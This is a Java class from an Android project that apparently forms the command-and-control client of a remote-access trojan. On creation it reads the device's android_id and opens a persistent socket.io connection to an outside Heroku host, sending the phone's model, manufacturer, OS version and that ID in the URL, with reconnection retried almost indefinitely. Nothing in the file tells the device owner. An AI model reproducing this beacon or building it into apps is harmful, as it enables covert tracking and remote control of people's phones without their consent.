package com.example.project20;

import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {
        try {
            String string = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), "android_id");
            IO.Options options = new IO.Options();
            options.reconnection = true;
            options.reconnectionDelay = 5000;
            options.reconnectionDelayMax = 999999999;
            this.ioSocket = IO.socket("http://xwizer.herokuapp.com:80?model=" + Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + string);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return this.ioSocket;
    }
}
